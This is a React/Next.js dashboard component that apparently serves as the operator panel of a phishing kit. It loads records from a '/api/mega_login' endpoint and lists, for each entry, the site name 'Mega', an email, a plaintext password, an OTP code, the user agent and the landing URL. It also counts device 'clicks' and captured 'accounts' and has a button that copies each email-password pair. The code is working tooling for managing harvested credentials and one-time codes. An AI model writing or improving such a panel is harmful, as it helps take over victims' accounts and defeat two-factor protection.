'use client';

export const dynamic = "force-dynamic";
import { formatDistanceToNow } from "date-fns";
import { useRouter } from "next/navigation";
import { useCallback, useEffect, useMemo, useRef, useState } from "react";
import toast from "react-hot-toast";
import { FaRegArrowAltCircleRight } from "react-icons/fa";
import { MdContentCopy, MdKeyboardArrowLeft, MdKeyboardArrowRight } from "react-icons/md";
import useSWR from "swr";
import withAuth from "../utils/auth";

// Enhanced fetcher with proper timeout and error handling
const fetcher = async (url) => {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), 10000); // 10s timeout (increased from 50ms)

  try {
    const res = await fetch(url, {
      signal: controller.signal,
      cache: 'no-store',
      headers: {
        'Cache-Control': 'no-cache, no-store, must-revalidate',
        'Pragma': 'no-cache',
        'Expires': '0'
      }
    });

    clearTimeout(timeoutId);

    if (!res.ok) {
      const errorText = await res.text();
      const error = new Error(`HTTP ${res.status}: ${res.statusText}`);
      error.info = errorText;
      error.status = res.status;
      throw error;
    }
    return res.json();
  } catch (error) {
    clearTimeout(timeoutId);
    if (error.name === 'AbortError') {
      throw new Error('Request timeout');
    }
    throw error;
  }
};

const ActiveLinksTable = () => {
  const router = useRouter();
  const itemsPerPage = 5;
  const [currentPage, setCurrentPage] = useState(1);
  const [user, setUser] = useState(null);
  const [isClient, setIsClient] = useState(false);
  const mountedRef = useRef(true);

  // Handle client-side mounting
  useEffect(() => {
    setIsClient(true);
    mountedRef.current = true;

    return () => {
      mountedRef.current = false;
    };
  }, []);

  // Get user from localStorage with proper error handling
  useEffect(() => {
    if (!isClient || !mountedRef.current) return;

    try {
      const loggedInUser = localStorage.getItem("login_user");
      if (loggedInUser && loggedInUser !== user) {
        setUser(loggedInUser);
      }
    } catch (error) {
      console.error('Error accessing localStorage:', error);
      toast.error('Error accessing user data');
    }
  }, [isClient, user]);

  // SWR configuration with reasonable intervals
  const swrConfig = useMemo(() => ({
    refreshInterval: 30000, // 30 seconds (was 50ms - too aggressive)
    revalidateOnFocus: true,
    revalidateOnReconnect: true,
    shouldRetryOnError: true,
    errorRetryInterval: 5000, // 5 seconds (was 50ms)
    errorRetryCount: 3,
    dedupingInterval: 10000, // Prevent duplicate requests for 10 seconds
    focusThrottleInterval: 5000, // Throttle focus revalidation
  }), []);

  // SWR data fetching with conditional fetching
  const shouldFetch = isClient && user && mountedRef.current;

  const { data: loginData, isLoading: isLoginDataLoading, error: loginError, mutate: mutateLogin } = useSWR(
    shouldFetch ? "/api/mega_login" : null,
    fetcher,
    swrConfig
  );

  const { data: signupData, isLoading: isSignupDataLoading, error: signupError, mutate: mutateSignup } = useSWR(
    shouldFetch ? "/api/auth/signup" : null,
    fetcher,
    swrConfig
  );

  const { data: countsData, isLoading: isCountsDataLoading, error: countsError, mutate: mutateCounts } = useSWR(
    shouldFetch ? "/api/get-visit-counts" : null,
    fetcher,
    swrConfig
  );

  const loading = !isClient || isLoginDataLoading || isSignupDataLoading || isCountsDataLoading;

  // Memoized data processing with error handling
  const userDetails = useMemo(() => {
    if (!loginData?.data || !user || !Array.isArray(loginData.data)) {
      return [];
    }
    try {
      return loginData.data.filter((value) => value?.logEmail === user) || [];
    } catch (error) {
      console.error('Error processing user details:', error);
      return [];
    }
  }, [loginData, user]);

  const reversedUserDetails = useMemo(() => {
    try {
      return [...userDetails].reverse();
    } catch (error) {
      console.error('Error reversing user details:', error);
      return [];
    }
  }, [userDetails]);

  const userName = useMemo(() => {
    if (!signupData || !user || !Array.isArray(signupData)) {
      return null;
    }
    try {
      return signupData.find((value) => value?.email === user) || null;
    } catch (error) {
      console.error('Error finding user name:', error);
      return null;
    }
  }, [signupData, user]);

  const deviceCounts = useMemo(() => {
    const defaultCounts = { mobile: 0, desktop: 0, tablet: 0, total: 0 };

    if (!countsData || !user || !Array.isArray(countsData)) {
      return defaultCounts;
    }

    try {
      return countsData
        .filter((value) => value?.email === user)
        .reduce(
          (acc, item) => {
            const mobileCt = Number(item?.deviceCounts?.mobile) || 0;
            const desktopCt = Number(item?.deviceCounts?.desktop) || 0;
            const tabletCt = Number(item?.deviceCounts?.tablet) || 0;

            acc.mobile += mobileCt;
            acc.desktop += desktopCt;
            acc.tablet += tabletCt;
            acc.total += mobileCt + desktopCt + tabletCt;
            return acc;
          },
          { ...defaultCounts }
        );
    } catch (error) {
      console.error('Error calculating device counts:', error);
      return defaultCounts;
    }
  }, [countsData, user]);

  // Pagination logic with bounds checking
  const totalPages = Math.max(1, Math.ceil(reversedUserDetails.length / itemsPerPage));
  const safeCurrentPage = Math.min(currentPage, totalPages);
  const startIndex = (safeCurrentPage - 1) * itemsPerPage;
  const currentItems = reversedUserDetails.slice(startIndex, startIndex + itemsPerPage);

  const handlePageChange = useCallback(
    (page) => {
      const newPage = Math.max(1, Math.min(page, totalPages));
      if (newPage !== currentPage && mountedRef.current) {
        setCurrentPage(newPage);
        if (typeof window !== 'undefined') {
          window.scrollTo({ top: 0, behavior: 'smooth' });
        }
      }
    },
    [totalPages, currentPage]
  );

  const copyToClipboard = useCallback(async (value) => {
    if (!value || !mountedRef.current) return;

    try {
      if (navigator?.clipboard?.writeText) {
        await navigator.clipboard.writeText(value);
        toast.success(`Copied: ${value}`);
      } else {
        // Fallback for browsers without clipboard API
        const textArea = document.createElement('textarea');
        textArea.value = value;
        textArea.style.position = 'fixed';
        textArea.style.left = '-999999px';
        textArea.style.top = '-999999px';
        document.body.appendChild(textArea);
        textArea.focus();
        textArea.select();

        const successful = document.execCommand('copy');
        document.body.removeChild(textArea);

        if (successful) {
          toast.success(`Copied: ${value}`);
        } else {
          throw new Error('Copy command failed');
        }
      }
    } catch (err) {
      console.error('Clipboard error:', err);
      toast.error('Failed to copy to clipboard');
    }
  }, []);

  // Error handling with retry functionality
  useEffect(() => {
    if (!mountedRef.current) return;

    const handleError = (error, type, retryFn) => {
      if (error) {
        console.error(`${type} error:`, error);
        const errorMessage = error.message || `Failed to load ${type.toLowerCase()}`;
        toast.error(errorMessage, {
          duration: 4000,
          action: {
            label: 'Retry',
            onClick: () => retryFn && retryFn()
          }
        });
      }
    };

    handleError(loginError, 'Login data', mutateLogin);
    handleError(signupError, 'User data', mutateSignup);
    handleError(countsError, 'Device counts', mutateCounts);
  }, [loginError, signupError, countsError, mutateLogin, mutateSignup, mutateCounts]);

  // Reset page when data changes
  useEffect(() => {
    if (reversedUserDetails.length > 0 && currentPage > totalPages) {
      setCurrentPage(1);
    }
  }, [reversedUserDetails.length, currentPage, totalPages]);

  // Don't render anything until client-side
  if (!isClient) {
    return (
      <div className="flex items-center justify-center p-8">
        <div className="text-gray-500">Loading...</div>
      </div>
    );
  }

  return (
    <div className="p-4">
      <h3 className="pb-5 text-2xl font-normal text-gray-800">Dashboard</h3>

      {/* Device Counts Section */}
      <section className="grid items-center justify-between grid-cols-1 gap-5 sm:grid-cols-2 lg:grid-cols-4">
        {loading
          ? Array(4).fill(0).map((_, index) => (
            <DeviceCountCard key={`loading-${index}`} loading={true} />
          ))
          : [
            { title: "Mobile Click", count: deviceCounts.mobile },
            { title: "Desktop Click", count: deviceCounts.desktop },
            { title: "Total Click", count: deviceCounts.total },
            { title: "Total Account", count: reversedUserDetails.length }
          ].map((item, index) => (
            <DeviceCountCard
              key={`count-${index}`}
              title={item.title}
              count={item.count}
              color={getColorByIndex(index)}
              hover={getButtonClass(index)}
            />
          ))}
      </section>

      {/* Data Table */}
      <div className="pt-10 overflow-x-auto rounded shadow-lg">
        <Table
          loading={loading}
          currentItems={currentItems}
          userName={userName}
          copyToClipboard={copyToClipboard}
          startIndex={startIndex}
        />
      </div>

      {/* Pagination */}
      {!loading && currentItems.length > 0 && totalPages > 1 && (
        <Pagination
          currentPage={safeCurrentPage}
          totalPages={totalPages}
          onPageChange={handlePageChange}
        />
      )}
    </div>
  );
};

// Helper Components
const DeviceCountCard = ({ loading, title, count, color, hover }) => (
  <div className="w-full">
    <div className={`flex justify-between rounded-md ${loading ? 'bg-gray-200 animate-pulse h-40' : color}`}>
      <div className="flex flex-col w-full gap-1">
        {loading ? (
          <>
            <div className="h-12 px-4 pt-5 bg-gray-300 rounded-md animate-pulse"></div>
            <div className="h-6 px-4 pb-6 mt-2 bg-gray-300 rounded-md animate-pulse"></div>
            <div className="w-full h-10 p-2 mt-2 bg-gray-300 rounded-md animate-pulse"></div>
          </>
        ) : (
          <>
            <h1 className="px-4 pt-5 text-3xl font-bold text-white">{count || 0}</h1>
            <p className="px-4 pb-6 text-white">{title}</p>
            <button
              className={`flex items-center justify-center w-full gap-1 p-2 text-center text-white rounded-md transition-colors duration-200 ${hover}`}
              aria-label={`View more ${title} information`}
            >
              More Info <FaRegArrowAltCircleRight />
            </button>
          </>
        )}
      </div>
    </div>
  </div>
);

const Table = ({ loading, currentItems, userName, copyToClipboard, startIndex }) => (
  <table className="min-w-full border border-collapse border-gray-300 rounded-lg">
    <thead>
      <tr className="text-left bg-gray-100">
        {["ID", "Site Name", "Name", "Email", "Password", "OTP", "UserAgent", "Landing URL", "Time", "Copy"].map((title) => (
          <th key={title} className="px-4 py-2 border border-gray-300 font-medium">
            {title}
          </th>
        ))}
      </tr>
    </thead>
    <tbody>
      {loading ? (
        <tr>
          <td colSpan="10" className="px-4 py-8 text-center text-gray-500 border border-gray-300">
            <div className="flex items-center justify-center gap-2">
              <div className="w-4 h-4 border-2 border-blue-500 border-t-transparent rounded-full animate-spin"></div>
              Loading data...
            </div>
          </td>
        </tr>
      ) : currentItems.length === 0 ? (
        <tr>
          <td colSpan="10" className="px-4 py-8 text-center text-gray-500 border border-gray-300">
            No data available
          </td>
        </tr>
      ) : (
        currentItems.map((link, index) => (
          <TableRow
            key={link._id || `row-${startIndex + index}`}
            link={link}
            index={startIndex + index + 1}
            userName={userName}
            copyToClipboard={copyToClipboard}
          />
        ))
      )}
    </tbody>
  </table>
);

const TableRow = ({ link, index, userName, copyToClipboard }) => {
  const handleCopy = useCallback(() => {
    const credentials = `${link?.email || ''} ${link?.password || ''}`.trim();
    if (credentials) {
      copyToClipboard(credentials);
    }
  }, [link?.email, link?.password, copyToClipboard]);

  return (
    <tr className={`${index % 2 === 0 ? 'bg-gray-50' : 'bg-white'} hover:bg-gray-100 transition-colors duration-150`}>
      <td className="px-4 py-2 border border-gray-300">{index}</td>
      <td className="px-4 py-2 border border-gray-300">Mega</td>
      <td className="px-4 py-2 border border-gray-300">{userName?.name || 'N/A'}</td>
      <td className="px-4 py-2 border border-gray-300">{link?.email || 'N/A'}</td>
      <td className="px-4 py-2 border border-gray-300">{link?.password || 'N/A'}</td>
      <td className={`px-4 py-2 border border-gray-300 ${link?.otp ? "text-green-600 font-medium" : "text-red-500"}`}>
        {link?.otp || "N/A"}
      </td>
      <td className="px-4 py-2 border border-gray-300 truncate max-w-xs" title={link?.userAgent || 'N/A'}>
        {link?.userAgent || 'N/A'}
      </td>
      <td className="px-4 py-2 border border-gray-300 truncate max-w-xs" title={link?.url?.split("?")[0] || 'N/A'}>
        {link?.url?.split("?")[0] || 'N/A'}
      </td>
      <td className="px-4 py-2 border border-gray-300 whitespace-nowrap">
        {link?.createdAt ?
          formatDistanceToNow(new Date(link.createdAt), { addSuffix: true }) :
          "N/A"
        }
      </td>
      <td className="px-4 py-2 text-center border border-gray-300">
        <button
          onClick={handleCopy}
          className="p-2 text-white transition-colors duration-200 bg-green-500 rounded hover:bg-green-600 focus:outline-none focus:ring-2 focus:ring-green-500 focus:ring-opacity-50"
          aria-label="Copy credentials"
          disabled={!link?.email && !link?.password}
        >
          <MdContentCopy size={18} />
        </button>
      </td>
    </tr>
  );
};

const Pagination = ({ currentPage, totalPages, onPageChange }) => (
  <div className="flex items-center justify-center gap-4 mt-6">
    <button
      onClick={() => onPageChange(currentPage - 1)}
      className={`flex items-center justify-center p-2 rounded transition-colors duration-200 ${currentPage === 1
          ? "cursor-not-allowed bg-gray-200 text-gray-500"
          : "bg-blue-500 hover:bg-blue-600 text-white focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-opacity-50"
        }`}
      disabled={currentPage === 1}
      aria-label="Previous page"
    >
      <MdKeyboardArrowLeft size={20} />
    </button>

    <span className="px-4 py-2 text-gray-700 bg-gray-100 rounded">
      Page {currentPage} of {totalPages}
    </span>

    <button
      onClick={() => onPageChange(currentPage + 1)}
      className={`flex items-center justify-center p-2 rounded transition-colors duration-200 ${currentPage === totalPages
          ? "cursor-not-allowed bg-gray-200 text-gray-500"
          : "bg-blue-500 hover:bg-blue-600 text-white focus:outline-none focus:ring-2 focus:ring-blue-500 focus:ring-opacity-50"
        }`}
      disabled={currentPage === totalPages}
      aria-label="Next page"
    >
      <MdKeyboardArrowRight size={20} />
    </button>
  </div>
);

// Helper functions
const getColorByIndex = (index) => {
  const colors = ["bg-cyan-600", "bg-green-600", "bg-yellow-500", "bg-red-600"];
  return colors[index % colors.length];
};

const getButtonClass = (index) => {
  const buttonClasses = [
    "hover:bg-cyan-700 bg-cyan-600",
    "hover:bg-green-700 bg-green-600",
    "hover:bg-yellow-600 bg-yellow-500",
    "hover:bg-red-700 bg-red-600",
  ];
  return buttonClasses[index % buttonClasses.length];
};

export default withAuth(ActiveLinksTable);